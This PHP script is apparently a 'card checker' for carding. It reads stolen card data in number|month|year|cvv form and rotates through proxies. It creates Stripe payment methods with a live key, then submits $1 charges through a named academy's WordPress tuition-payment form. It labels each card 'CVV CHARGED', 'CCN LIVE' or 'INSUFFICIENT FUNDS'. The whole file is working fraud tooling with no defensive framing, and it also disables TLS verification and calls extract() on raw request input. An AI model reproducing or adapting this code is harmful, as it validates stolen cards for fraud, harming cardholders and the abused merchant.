<?php 
////////////////////////////===RAW BY HARIS===////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[1 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51MWmbSICV1I3jxabAyBu86sWMgPP177PcGAwChat4WAc5SPafgMTD1biYFDqZHGUgHirfVUP3k6ypFa2uFzRl7jj00D3nJcKy6');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://5tbeautyacademy.org/wp-admin/admin-ajax.php?t=1716710321120');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1716710321120 h2',
'Host: 5tbeautyacademy.org',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://5tbeautyacademy.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://5tbeautyacademy.org/tuition-payment/',
'accept-language: en-US,en;q=0.9',
));

////////////////////////////===[2 Req Postfields]////////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D19507%26_fluentform_6_fluentformnonce%3Db962fdafb0%26_wp_http_referer%3D%252Ftuition-payment%252F%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3Dgloosmoke%2540gmail.com%26input_text%3DNY%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=6');

$result2 = curl_exec($ch);

////////////////////////////===[Responses CVV]===////////////////////////////

sleep(10);
if
(strpos($result2,  'Thank you for your message.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 1$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power ᴛᴏxɪ𝐶 ✘ᴅ ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power ᴛᴏxɪ𝐶 ✘ᴅ ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power ᴛᴏxɪ𝐶 ✘ᴅ ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'insufficient funds')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Power ᴛᴏxɪ𝐶 ✘ᴅ ⚡ </i></font><br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>❌ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: GENERIC DECLINED ❌ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;
////////////////////////////===RAW BY HARIS===////////////////////////////
?>